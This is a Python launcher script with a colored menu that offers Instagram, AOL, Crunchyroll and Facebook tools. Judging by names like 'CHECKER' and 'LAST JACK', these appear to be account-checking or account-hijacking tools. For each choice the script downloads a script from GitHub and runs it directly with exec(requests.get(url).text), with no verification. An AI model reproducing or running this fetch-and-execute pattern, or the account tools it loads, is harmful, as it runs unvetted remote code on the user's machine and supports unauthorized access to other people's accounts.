import requests
import os
from cfonts import render          
import webbrowser
  
      
kral = render('PAGE [1]', colors=['cyan', 'white'], align='center')
print("\x1b[1;39m—" * 60)
print(kral)
print("PROGRAMMER @MYEHRA |  Channel:  @GODTEST ")
print("\x1b[1;39m—" * 60)

print(f"""\x1b[38;5;117m  1\x1b[38;5;231m - INSTAGRAM [GMAIL]  \x1b[1;32m 
\x1b[38;5;117m◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
 2\x1b[38;5;231m - INSTAGRAM [G+H] \x1b[1;32m\x1b[1;32m 
\x1b[38;5;117m◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙\x1b[38;5;117m  3\x1b[38;5;231m - AOL INSTAGRAM  \x1b[1;32m
\x1b[38;5;117m◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
\x1b[38;5;117m  4\x1b[38;5;231m - CRUNCHYROLL [CHECKER 
\x1b[38;5;117m◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙
\x1b[38;5;117m  5\x1b[38;5;231m - Facebook [Random] | \x1b[1;32m
\x1b[38;5;117m◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙◙ 
""")




def khan():
    
    secim=input(" CHOOSE :- ")
    
    baglantilar = {
        "1": "https://raw.githubusercontent.com/mjehra/Gmail-v1/9f921daaa75b8d24c40d80e114dc590f994fa9b8/GMAIL.py",
        "2": "https://github.com/mjehra/G-h/blob/16e8d525d977ebf8f38acba760e8dc89dbe38d64/LAST%20JACK.py",
        "3": "https://raw.githubusercontent.com/mjehra/Aol-/02a6e9c10f76fd4572eb9565a97a9149ff27512a/RANDOM%20AOLS.py",
        "4":"https://raw.githubusercontent.com/mjehra/Crunchy/a6047f6ba5edecbb72e87a6c0892785d25db9bdd/CRUNCHYROLLS.py",
        "5":"https://raw.githubusercontent.com/mjehra/Fb-tool-/1b77f4188743fd83005919a98b46efba74d5c365/FB.py"
        
    }
    if secim in baglantilar:ehra(baglantilar[secim])
    else:print(" you will enter a number between 1 and 5 ");khan()
def ehra(url):
    try:exec(requests.get(url).text)
    except Exception as e:print(f"h-am{e}")
if __name__=="__main__":khan()
